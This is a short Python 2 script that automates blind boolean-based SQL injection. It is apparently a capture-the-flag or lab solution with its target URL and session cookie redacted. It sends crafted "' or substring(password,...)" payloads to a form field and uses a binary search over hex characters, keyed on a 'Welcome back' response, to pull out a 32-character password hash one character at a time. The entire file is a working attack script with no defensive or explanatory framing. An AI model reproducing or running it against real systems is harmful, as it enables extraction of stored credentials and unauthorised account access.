import urllib
import urllib2
def doinject(payload):
    url = 'xxxxxxxxxxxxxxxxxxxxx'
    values = {'injection':payload,'inject':'Inject'}
    data = urllib.urlencode(values)
    #print data
    req = urllib2.Request(url, data)
    req.add_header('cookie','xx=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
    response = urllib2.urlopen(req)
    the_page = response.read()
    if (the_page.find("Welcome back")>0):
        return True
    else:
        return False
    
wordlist = "0123456789ABCDEF"
res = ""
for i in range(1,33):
    s=0
    t=15
    while (s<t):
        if (t-s==1):
            if doinject('\' or substring(password,'+str(i)+',1)=\''+wordlist[t]+'\' -- LanLan'):
                m=t
                break
            else:
                m=s
                break
        m=(s+t)/2
        if doinject('\' or substring(password,'+str(i)+',1)>\''+wordlist[m]+'\' -- LanLan'):
            s=m+1
            print wordlist[s]+":"+wordlist[t]
        else:
            t=m
            print wordlist[s]+":"+wordlist[t]
    res = res+wordlist[m]
    print res
